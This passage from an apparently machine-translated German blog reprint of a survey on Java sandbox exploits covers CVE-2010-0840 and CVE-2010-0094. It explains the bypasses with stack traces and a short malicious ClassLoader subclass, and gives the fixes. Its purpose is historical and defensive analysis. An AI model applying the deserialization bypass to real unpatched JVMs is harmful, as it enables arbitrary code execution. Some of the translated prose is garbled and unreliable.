<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">at java.beans.Statement.invoke(Statement.java:<span class="number">235</span>)</span><br><span class="line">at java.beans.Expression.getValue(Expression.java:<span class="number">98</span>)</span><br><span class="line">at java.util.AbstractMap.toString(AbstractMap.java:<span class="number">487</span>)</span><br><span class="line">at javax.swing.DefaultListCellRenderer.getListCellRendererComponent</span><br><span class="line">	(DefaultListCellRenderer.java:<span class="number">125</span>)</span><br><span class="line">at javax.swing.plaf.basic.BasicListUI.updateLayoutState</span><br><span class="line">	(BasicListUI.java:<span class="number">1337</span>)</span><br><span class="line">at javax.swing.plaf.basic.BasicListUI.maybeUpdateLayoutState</span><br><span class="line">	(BasicListUI.java:<span class="number">1287</span>)</span><br><span class="line">at javax.swing.plaf.basic.BasicListUI.paintImpl(BasicListUI.java:<span class="number">251</span>)</span><br><span class="line">at javax.swing.plaf.basic.BasicListUI.paint(BasicListUI.java:<span class="number">227</span>)</span><br><span class="line">at javax.swing.plaf.ComponentUI.update(ComponentUI.java:<span class="number">143</span>)</span><br><span class="line">at javax.swing.JComponent.paintComponent(JComponent.java:<span class="number">758</span>)</span><br><span class="line">at javax.swing.JComponent.paint(JComponent.java:<span class="number">1022</span>)</span><br><span class="line">at javax.swing.JComponent.paintChildren(JComponent.java:<span class="number">859</span>)</span><br><span class="line">at javax.swing.JComponent.paint(JComponent.java:<span class="number">1031</span>)</span><br><span class="line">at javax.swing.JComponent.paintChildren(JComponent.java:<span class="number">859</span>)</span><br><span class="line">at javax.swing.JComponent.paint(JComponent.java:<span class="number">1031</span>)</span><br><span class="line">at javax.swing.JLayeredPane.paint(JLayeredPane.java:<span class="number">564</span>)</span><br><span class="line">at javax.swing.JComponent.paintChildren(JComponent.java:<span class="number">859</span>)</span><br><span class="line">at javax.swing.JComponent.paint(JComponent.java:<span class="number">1031</span>)</span><br><span class="line">at javax.swing.JComponent.paintToOffscreen(JComponent.java:<span class="number">5104</span>)</span><br><span class="line">at javax.swing.BufferStrategyPaintManager.paint</span><br><span class="line">	(BufferStrategyPaintManager.java:<span class="number">285</span>)</span><br><span class="line">at javax.swing.RepaintManager.paint(RepaintManager.java:<span class="number">1128</span>)</span><br><span class="line">at javax.swing.JComponent._paintImmediately(JComponent.java:<span class="number">5052</span>)</span><br><span class="line">at javax.swing.JComponent.paintImmediately(JComponent.java:<span class="number">4862</span>)</span><br><span class="line">at javax.swing.RepaintManager.paintDirtyRegions</span><br><span class="line">	(RepaintManager.java:<span class="number">723</span>)</span><br><span class="line">at javax.swing.RepaintManager.paintDirtyRegions</span><br><span class="line">	(RepaintManager.java:<span class="number">679</span>)</span><br><span class="line">at javax.swing.RepaintManager.seqPaintDirtyRegions</span><br><span class="line">	(RepaintManager.java:<span class="number">659</span>)</span><br><span class="line">at javax.swing.SystemEventQueueUtilities$ComponentWorkRequest.run</span><br><span class="line">	(SystemEventQueueUtilities.java:<span class="number">128</span>)</span><br><span class="line">at java.awt.event.InvocationEvent.dispatch(InvocationEvent.java:<span class="number">209</span>)</span><br><span class="line">at java.awt.EventQueue.dispatchEvent(EventQueue.java:<span class="number">597</span>)</span><br><span class="line">at java.awt.EventDispatchThread.pumpOneEventForFilters</span><br><span class="line">	(EventDispatchThread.java:<span class="number">273</span>)</span><br><span class="line">at java.awt.EventDispatchThread.pumpEventsForFilter</span><br><span class="line">	(EventDispatchThread.java:<span class="number">183</span>)</span><br><span class="line">at java.awt.EventDispatchThread.pumpEventsForHierarchy</span><br><span class="line">	(EventDispatchThread.java:<span class="number">173</span>)</span><br><span class="line">at java.awt.EventDispatchThread.pumpEvents</span><br><span class="line">	(EventDispatchThread.java:<span class="number">168</span>)</span><br><span class="line">at java.awt.EventDispatchThread.pumpEvents</span><br><span class="line">	(EventDispatchThread.java:<span class="number">160</span>)</span><br><span class="line">at java.awt.EventDispatchThread.run(EventDispatchThread.java:<span class="number">121</span>)</span><br></pre></td></tr></table></figure>
<p>Die erste Beobachtung ist, dass es auf dem Aufruf-Stack keine nicht vertrauenswürdigen Klassen gibt. Alle Sicherheitsprüfungen, die an den Elementen des Aufrufstapels durchgeführt werden, werden bestanden.<br>Wie im obigen Aufrufstapel gezeigt, ruft die Zeichenoperation (RepaintManager.java:1128) schließlich die Methode getListCellRendererComponent () auf (DefaultListCellRenderer.java:125). Der Konstruktor <em>JList</em> übernimmt eine Liste von Elementelementen als Argumente. Diese Methode wiederum ruft die toString () -Methode für das Projekt auf. Das erste Element ist <em>Map</em>, das getValue () für alle seine Items aufruft. Die Methode getValue () ruft Statement.invoke () auf, wodurch die Zielmethode des Analysten durch Reflektion aufgerufen wird.</p>
<h5 id="4-3-3-Diskussion"><a href="#4-3-3-Diskussion" class="headerlink" title="4.3.3 Diskussion"></a>4.3.3 Diskussion</h5><p>Korrigieren Sie diese Sicherheitsanfälligkeit, indem Sie die Methode Statement.invoke () so ändern, dass ein Reflektionsaufruf im <em>AccessControlContext</em> des Codes ausgeführt wird, der <em>Statement</em> erstellt. Diese Sicherheitsanfälligkeit trifft nicht auf die neueste Version von JRE zu, da der nicht vertrauenswürdige Code, der <em>Statement</em> erstellt, keine Berechtigungen besitzt.</p>
<h4 id="4-4-Serialisierung"><a href="#4-4-Serialisierung" class="headerlink" title="4.4 Serialisierung"></a>4.4 Serialisierung</h4><h5 id="4-4-1-Hintergrund"><a href="#4-4-1-Hintergrund" class="headerlink" title="4.4.1 Hintergrund"></a>4.4.1 Hintergrund</h5><p>Java ermöglicht die Konvertierung von Objekten in Byte-Streams zur Laufzeit, was sehr nützlich für die Persistenz und Netzwerkkommunikation ist. Der Prozess des Konvertierens eines Objekts in eine Sequenz von Bytes wird als seriell bezeichnet, und der umgekehrte Prozess des Konvertierens eines Bytestroms in ein Objekt wird als Deserialisierung bezeichnet. Ein Teil des Prozesses der Vervollständigung der Deserialisierung in einem privilegierten Kontext kann auftreten. Analysten können dies ausnutzen, indem sie Objekte instanziieren, die normalerweise aufgrund fehlender Berechtigungen nicht instanziiert werden können. Ein typisches Beispiel ist die Klasse <em>java.lang.ClassLoader</em>. Der Analyst (immer ohne Berechtigungen) kann die <em>ClassLoader</em>-Unterklasse _S_ nicht direkt instanziieren, da der Konstruktor von <em>ClassLoader</em> überprüft, ob der Aufrufer die Berechtigung CREATE_CLASSLOADER besitzt. Wenn er jedoch eine Möglichkeit findet, die serialisierte Version von _S_ im Berechtigungskontext zu deserialisieren, erhält er möglicherweise eine Instanz von _S_. Beachten Sie, dass die serialisierte Version von _S_ von einem Analysten erstellt werden kann, der sich außerhalb des Angriffsbereichs befindet (z. B. auf seinem eigenen Rechner ohne JVM mit Sandbox). Während eines Angriffs handelt es sich bei der serialisierten Version einfach um Daten, die die Instanz _S_ darstellen. In diesem Abschnitt zeigen wir, wie CVE-2010-0094 verwendet wird, um Systemcode zu verwenden, der die von Analysten bereitgestellten Daten in einem privilegierten Kontext deserialisiert. Dies kann zum Ausführen von beliebigem Code unter Umgehung aller Sandbox-Einschränkungen verwendet werden.</p>
<h5 id="4-4-2-Beispiel-CVE-2010-0094"><a href="#4-4-2-Beispiel-CVE-2010-0094" class="headerlink" title="4.4.2 Beispiel: CVE-2010-0094"></a>4.4.2 Beispiel: CVE-2010-0094</h5><p>Die Sicherheitsanfälligkeit CVE-2010-0094 befindet sich in der Methode RMIConnectionImpl.createMBean (String, ObjectName, ObjectName, MarshalledObject, String [], Subject). Das vierte Argument des Typs <em>MarshalledObject</em> enthält eine Byte-Repräsentation des Objekts _S_, das im Berechtigungskontext (innerhalb des doPrivileged () - Aufrufs mit allen Privilegien deserialisiert wird). Analysten können beliebige Objekte übergeben, um MBean () für die Deserialisierung zu erstellen. In unserem Beispiel hat er eine Unterklasse von <em>java.lang.ClassLoader</em> übergeben:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">S</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>In der anfälligen JVM-Version (z. B. 1.6.0_17) lautet der Aufruf-Stack beim Instanziieren des Objekts _S_ wie folgt:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: Thread [main] (Suspended (breakpoint at line <span class="number">226</span> in ClassLoader))</span><br><span class="line"> <span class="number">2</span>: 	S(ClassLoader).&lt;init&gt;() line: <span class="number">226</span> [local variables</span><br><span class="line">    		unavailable]</span><br><span class="line"> <span class="number">4</span>: 	GeneratedSerializationConstructorAccessor1.newInstance(Object[])</span><br><span class="line">    		line: not available</span><br><span class="line"> <span class="number">6</span>: 	Constructor&lt;T&gt;.newInstance(Object...) line: <span class="number">513</span></span><br><span class="line"> <span class="number">7</span>: 	ObjectStreamClass.newInstance() line: <span class="number">924</span></span><br><span class="line"> <span class="number">8</span>: 	MarshalledObject$MarshalledObjectInputStream</span><br><span class="line">    		(ObjectInputStream).readOrdinaryObject(<span class="keyword">boolean</span>) line: <span class="number">1737</span></span><br><span class="line"><span class="number">10</span>: 	MarshalledObject$MarshalledObjectInputStream</span><br><span class="line">    		(ObjectInputStream).readObject0(<span class="keyword">boolean</span>) line: <span class="number">1329</span></span><br><span class="line"><span class="number">12</span>: 	MarshalledObject$MarshalledObjectInputStream</span><br><span class="line">    		(ObjectInputStream).readObject() line: <span class="number">351</span></span><br><span class="line"><span class="number">14</span>: 	MarshalledObject&lt;T&gt;.get() line: <span class="number">142</span></span><br><span class="line"><span class="number">15</span>: 	RMIConnectionImpl$<span class="number">6</span>.run() line: <span class="number">1513</span></span><br><span class="line"><span class="number">16</span>: 	AccessController.doPrivileged(PrivilegedExceptionAction&lt;T&gt;)</span><br><span class="line">    		line: not available [<span class="keyword">native</span> method]</span><br><span class="line"><span class="number">18</span>: 	RMIConnectionImpl.unwrap(MarshalledObject, ClassLoader,</span><br><span class="line">    		Class&lt;T&gt;) line: <span class="number">1505</span></span><br><span class="line"><span class="number">20</span>: 	RMIConnectionImpl.access$<span class="number">500</span>(MarshalledObject, ClassLoader,</span><br><span class="line">    		Class) line: <span class="number">72</span></span><br><span class="line"><span class="number">22</span>: 	RMIConnectionImpl$<span class="number">7</span>.run() line: <span class="number">1548</span></span><br><span class="line"><span class="number">23</span>: 	AccessController.doPrivileged(PrivilegedExceptionAction&lt;T&gt;)</span><br><span class="line">    		line: not available [<span class="keyword">native</span> method]</span><br><span class="line"><span class="number">25</span>: 	RMIConnectionImpl.unwrap(MarshalledObject, ClassLoader,</span><br><span class="line">    		ClassLoader, Class&lt;T&gt;) line: <span class="number">1544</span></span><br><span class="line"><span class="number">27</span>: 	RMIConnectionImpl.createMBean(String, ObjectName, ObjectName,</span><br><span class="line">    		MarshalledObject, String[], Subject) line: <span class="number">376</span></span><br><span class="line"><span class="number">29</span>: 	Exploit.exploit() line: <span class="number">79</span></span><br><span class="line"><span class="number">30</span>: 	Exploit(BypassExploit).run_exploit() line: <span class="number">24</span></span><br><span class="line"><span class="number">31</span>: 	ExploitBase.run(ExploitBase) line: <span class="number">20</span></span><br><span class="line"><span class="number">32</span>: 	Exploit.main(String[]) line: <span class="number">19</span></span><br></pre></td></tr></table></figure>
<p>Wir beobachten, dass die Deserialisierung im Berechtigungskontext auftritt (in doPrivileged () in den Zeilen 16 und 23). Beachten Sie, dass es der Konstruktor der <em>ClassLoader</em>-Klasse (<init> (), vertrauenswürdiger Code) ist, der sich auf dem Stapel befindet, nicht der Konstruktor von _S_ (Parser-Klasse, nicht vertrauenswürdiger Code). Beachten Sie, dass in Zeile 2 “S (ClassLoader)” bedeutet, dass <em>ClassLoader</em> auf dem Stapel ist, nicht _S_. Wenn sich _S_ bereits auf dem Stapel befindet, löst die Berechtigungsprüfung im <em>ClassLoader</em> -Konstruktor eine Sicherheitsausnahme aus, da sich der nicht vertrauenswürdige Code (und damit keine Berechtigungen) auf dem Stapel befindet. Warum ist _S_ nicht auf dem Aufrufstapel? Die Antwort finden Sie in der Dokumentation zum Serialisierungsprotokoll. Es zeigt an, dass der konstruierte Konstruktor der erste Konstruktor der Klassenhierarchie ist, der die Schnittstelle <em>Serializable</em> nicht implementiert. In unserem Beispiel implementiert _S_ <em>Serializable</em>, sodass der Konstruktor nicht aufgerufen wird. _S_Extension_ClassLoader_, das <em>Serializable</em> nicht implementiert. Daher ruft der Deserialisierungssystemcode den leeren Konstruktor von <em>ClassLoader</em> auf. Daher enthält die Stapelüberwachung nur vertrauenswürdige Systemklassen auf dem Stapel im privilegierten Kontext (nicht vertrauenswürdiger Code kann nach doPrivileged () vorhanden sein, da die Berechtigungsprüfung bei der doPrivileged () - Methode beim Überprüfen des Aufrufstapels angehalten wird). Die Berechtigungsprüfung in <em>ClassLoader</em> wird erfolgreich ausgeführt.<br>Später im Systemcode wird diese Instanz von _S_ jedoch in den Typ _S_ anstelle von <em>ClassLoader</em> umgewandelt. Wie also können Analysten diese Instanz abrufen? Eine Lösung besteht darin, statische Felder zu _S_ hinzuzufügen und der Klasse _S_ Methoden hinzuzufügen, die Verweise auf _S_-Instanzen in statischen Feldern enthalten:</init></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">S</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> S myCL = <span class="keyword">null</span>;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span></span><br><span class="line"><span class="function">	  <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"> 		S.myCL = <span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Die readObject () -Methode ist eine spezielle Methode, die während der Deserialisierung (über das readOrdinaryObject () in Zeile 8 des oben genannten Aufruf-Stacks) aufgerufen wird. Zu diesem Zeitpunkt werden keine Berechtigungsprüfungen durchgeführt, daher kann sich nicht vertrauenswürdiger Code (Methode S.readObject ()) auf dem Aufrufstapel befinden.<br>Analysten können nun auf Instanzen von _S_ zugreifen. Da _S_ eine Unterklasse von <em>ClassLoader</em> ist, kann der Analyst eine neue Klasse mit allen Berechtigungen definieren und den Sicherheitsmanager deaktivieren (ähnlich der Methode in Abschnitt 3.1.1). Zu diesem Zeitpunkt ist die Sandbox deaktiviert und der Analyst kann beliebigen Code ausführen.<br>Diese Sicherheitsanfälligkeit betrifft 14 Java 1.6-Versionen (von Version 1.6.0_01 bis 1.6.0_18). Es wurde in der Version 1.6.0_24 korrigiert.<br>Die folgende Kombination von “Features” ermöglicht es Analysten, die Sandbox zu umgehen: (1) vertrauenswürdiger Code ermöglicht Deserialisierung von nicht vertrauenswürdigen code-gesteuerten Daten, (2) Deserialisierung in privilegiertem Kontext und (3) Objekte werden auf folgende Weise erstellt: Die Deserialisierungsmethode folgt einem anderen Prozess als die normale Instanziierung von Objekten.<br>Sicherheitsanfälligkeit CVE-2010-0094 wurde in Java 1.6.0 Update 24 behoben. Zwei Aufrufe von doPrivileged () wurden aus dem Code entfernt. Wenn in der gepatchten Version <em>ClassLoader</em> initialisiert wird, schlägt die Berechtigungsprüfung fehl, da der gesamte Aufruf-Stack jetzt geprüft wird (siehe den neuen Aufruf-Stack unten). Nicht vertrauenswürdiger Code in Zeile 21 und darunter verfügt nicht über die Berechtigung CREATE_CLASSLOADER.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: Thread [main] (Suspended (breakpoint at line <span class="number">226</span> in ClassLoader))</span><br><span class="line"> <span class="number">2</span>: 	MyClassLoader(ClassLoader).&lt;init&gt;() line: <span class="number">226</span> [local variables</span><br><span class="line">    		unavailable]</span><br><span class="line"> <span class="number">4</span>: 	GeneratedSerializationConstructorAccessor1.newInstance(Object[])</span><br><span class="line">    		line: not available</span><br><span class="line"> <span class="number">6</span>: 	Constructor&lt;T&gt;.newInstance(Object...) line: <span class="number">513</span></span><br><span class="line"> <span class="number">7</span>: 	ObjectStreamClass.newInstance() line: <span class="number">924</span></span><br><span class="line"> <span class="number">8</span>: 	MarshalledObject$MarshalledObjectInputStream</span><br><span class="line">    		(ObjectInputStream).readOrdinaryObject(<span class="keyword">boolean</span>) line: <span class="number">1736</span></span><br><span class="line"><span class="number">10</span>: 	MarshalledObject$MarshalledObjectInputStream(ObjectInputStream)</span><br><span class="line">    		.readObject0(<span class="keyword">boolean</span>) line: <span class="number">1328</span></span><br><span class="line"><span class="number">12</span>: 	MarshalledObject$MarshalledObjectInputStream(ObjectInputStream)</span><br><span class="line">    		.readObject() line: <span class="number">350</span></span><br><span class="line"><span class="number">14</span>: 	MarshalledObject&lt;T&gt;.get() line: <span class="number">142</span></span><br><span class="line"><span class="number">15</span>: 	RMIConnectionImpl.unwrap(MarshalledObject, ClassLoader,</span><br><span class="line">    		Class&lt;T&gt;) line: <span class="number">1523</span></span><br><span class="line"><span class="number">17</span>: 	RMIConnectionImpl.unwrap(MarshalledObject, ClassLoader,</span><br><span class="line">    		ClassLoader, Class&lt;T&gt;) line: <span class="number">1559</span></span><br><span class="line"><span class="number">19</span>: 	RMIConnectionImpl.createMBean(String, ObjectName, ObjectName,</span><br><span class="line">    		MarshalledObject, String[], Subject) line: <span class="number">376</span></span><br><span class="line"><span class="number">21</span>: 	Exploit.exploit() line: <span class="number">79</span></span><br><span class="line"><span class="number">22</span>: 	Exploit(BypassExploit).run_exploit() line: <span class="number">24</span></span><br><span class="line"><span class="number">23</span>: 	ExploitBase.run(ExploitBase) line: <span class="number">20</span></span><br><span class="line"><span class="number">24</span>: 	Exploit.main(String[]) line: <span class="number">19</span></span><br></pre></td></tr></table></figure>
<h5 id="4-4-3-Diskussion"><a href="#4-4-3-Diskussion" class="headerlink" title="4.4.3 Diskussion"></a>4.4.3 Diskussion</h5><p>Dies zeigt an, dass die Sequenzübereinstimmung Verwundbarkeit Eigenschaften (spezifisches Konstruktor aufruft nur) mit dem System verwundbar Code verwendet werden, was den Datenanalyst Steuer privilegierten Kontext deserialisiert die Sandbox und führt zu umgehen Freier Code. Da das Serialisierungsprotokoll aus Gründen der Abwärtskompatibilität nicht einfach geändert werden kann, wurde der anfällige Code gepatcht.</p>
<h3 id="5-Fazit"><a href="#5-Fazit" class="headerlink" title="5 Fazit"></a>5 Fazit</h3><p>In diesem Artikel konzentrieren wir uns auf das komplexe Sicherheitsmodell der Java-Plattform, das seit etwa 20 Jahren angegriffen wird. Wir zeigen, dass die Plattform bietet native Komponenten (wie zB Java Virtual Machine), sowie eine große Anzahl von Java-System-Klasse (JCL), und die beiden Teile des Systems haben sehr unterschiedliche Angriffe gewesen. Dazu gehören Low-Level-Angriffe wie Speicherbeschädigungsanfälligkeiten und Angriffe auf Java-Ebene zur Durchsetzung von Richtlinien, z. B. Angriffe mit vertrauenswürdigen Methodenketten. Dies zeigt, wie schwierig es ist, die tatsächliche Nutzung der Plattform zu schützen.<br>In diesem Beitrag werden wir als ein Fall eingeführt, um die komplexen System wie eine Java-Plattform zu zeigen, wie sicher möglicherweise die Ausführung bösartigen Code enthalten. Hoffentlich bietet dieser Überblick über frühere Java-Exploits Einblicke, die uns helfen werden, in Zukunft leistungsfähigere Systeme zu entwickeln.</p>

    </div>
    
    <div class="post-footer">
        <div>
            
                Reprint statement：For commercial reprint, please contact the author for authorization. For non-commercial reprint, please indicate the source. © <a href="https://fun.diyz.bid/" target="_blank">hellozz</a>
            
        </div>
        <div>
            
        </div>
    </div>
</article>

<div class="article-nav prev-next-wrap clearfix">
    
        <a href="/posts/d9b0dc94/" class="pre-post btn btn-default" title='Sicherheitsdesign Checkliste'>
            <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
            <span class="hidden-xs">Sicherheitsdesign Checkliste</span>
        </a>
    
    
        <a href="/posts/f2c92c0/" class="next-post btn btn-default" title='Trading System Häufig gestellte Fragen und Lösungen Übersicht'>
            <span class="hidden-lg">下一篇</span>
            <span class="hidden-xs">Trading System Häufig gestellte Fragen und Lösungen Übersicht</span><i class="fa fa-angle-right fa-fw"></i>
        </a>
    
</div>


    <div id="comments">
        
    
    <div id="vcomments" class="valine"></div>
    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="/assets/valine.min.js"></script>

    <script>
        new Valine({
            av: AV,
            el: '#vcomments',
            appId: '9PIhgUATHbAKruqK6VqLc78X-gzGzoHsz',
            appKey: '3yJCdKwimcEg4SEY3GquAhFw',
            placeholder: 'say something',
            notify: false,
            verify: false,
            avatar: 'mm',
            meta: 'nick,mail'.split(','),
            pageSize: '10',
            path: window.location.pathname,
            lang: 'en'.toLowerCase()
        })
    </script>


    </div>





                </main>
                
                    <aside id="article-toc" role="navigation" class="col-md-4">
    
        
			<div class="widget">
				<h3 class="title">Table of Contents</h3>
				<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Einfuhrung"><span class="toc-text">1. Einführung</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Hintergrund-Eine-kurze-Geschichte"><span class="toc-text">2. Hintergrund Eine kurze Geschichte</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-Java-Sandbox-Schwachstellen"><span class="toc-text">2.1 Java-Sandbox-Schwachstellen</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-Java-Plattform"><span class="toc-text">2.2 Java-Plattform</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-Security-Management"><span class="toc-text">2.3 Security Management</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-doPrivileged-Methode"><span class="toc-text">2,4 doPrivileged-Methode</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Speicherbeschadigungsanfalligkeit"><span class="toc-text">3. Speicherbeschädigungsanfälligkeit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-Art-der-Verwirrung"><span class="toc-text">3.1 Art der Verwirrung</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3-1-1-Hintergrund"><span class="toc-text">3.1.1 Hintergrund</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-1-3-Diskussion"><span class="toc-text">3.1.3 Diskussion</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-Integer-Uberlauf"><span class="toc-text">3.2 Integer Überlauf</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3-2-1-Hintergrund"><span class="toc-text">3.2.1 Hintergrund</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-2-2-Beispiel-CVE-2015-4843"><span class="toc-text">3.2.2 Beispiel: CVE-2015-4843</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-2-3-Diskussion"><span class="toc-text">3.2.3 Diskussion</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Java-Level-Schwachstelle"><span class="toc-text">4 Java Level Schwachstelle</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-Verwirrung-Agent"><span class="toc-text">4.1 Verwirrung Agent</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#4-1-1-Hintergrund"><span class="toc-text">4.1.1 Hintergrund</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-1-2-Beispiel-CVE-2012-4681"><span class="toc-text">4.1.2 Beispiel: CVE-2012-4681</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-1-3-Diskussion"><span class="toc-text">4.1.3 Diskussion</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-Nicht-initialisierte-Instanz"><span class="toc-text">4.2 Nicht initialisierte Instanz</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#4-2-1-Hintergrund"><span class="toc-text">4.2.1 Hintergrund</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-2-2-Beispiel-CVE-2017-3289"><span class="toc-text">4.2.2 Beispiel: CVE-2017-3289</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-2-3-Diskussion"><span class="toc-text">4.2.3 Diskussion</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-Vertrauenswurdige-Methodenkette"><span class="toc-text">4.3 Vertrauenswürdige Methodenkette</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#4-3-1-Hintergrund"><span class="toc-text">4.3.1 Hintergrund</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-3-2-Beispiel-CVE-2010-0840"><span class="toc-text">4.3.2 Beispiel: CVE-2010-0840</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-3-3-Diskussion"><span class="toc-text">4.3.3 Diskussion</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-Serialisierung"><span class="toc-text">4.4 Serialisierung</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#4-4-1-Hintergrund"><span class="toc-text">4.4.1 Hintergrund</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-4-2-Beispiel-CVE-2010-0094"><span class="toc-text">4.4.2 Beispiel: CVE-2010-0094</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-4-3-Diskussion"><span class="toc-text">4.4.3 Diskussion</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Fazit"><span class="toc-text">5 Fazit</span></a></li></ol>
				<div class="widget_stick">

</div>




<style>
.widget_stick {
    margin-bottom: 10px;
}

.widget_stick .stick {
    display: block;
    padding: 0 15px 15px;
    border: 1px solid #eaeaea;
    background-color: #fff;
    font-size: 12px;
    border-radius: 4px;
}

.widget_stick .stick h2 {
    font-size: 20px;
    font-weight: normal;
    margin-top: 14px;
    color: #FF787E;
}

.widget_stick .stick p {
    color: #5f6367;
    margin-bottom: 0;
}

.widget_stick .stick p a{
    display: block;
    font-size: 13px;
    color:#00c1de
}

.widget_stick .stick strong {
    margin: -1px 0 0 0;
    display: inline-block;
    padding: 4px 15px;
    color: #fff;
    font-size: 14px;
    font-weight: normal;
    background-color: #FF787E;
}

.widget_stick .stick a img {
    width: 100%;
    max-width: 100%;
}


</style>



			</div>
        
 
</aside>

                
            </div>
        </div>
    </section>
    <footer class="main-footer">
    <div class="container">
        <div class="row">
        </div>
    </div>
</footer>

<a id="back-to-top" class="icon-btn hide">
	<i class="fa fa-chevron-up"></i>
</a>




    <div class="copyright">
    <div class="container">
        <div class="row">
            <div class="col-sm-12">
                <div class="busuanzi">
    
</div>

            </div>
            <div class="col-sm-12">
                <span>Copyright &copy; 
                </span> |
                <span>
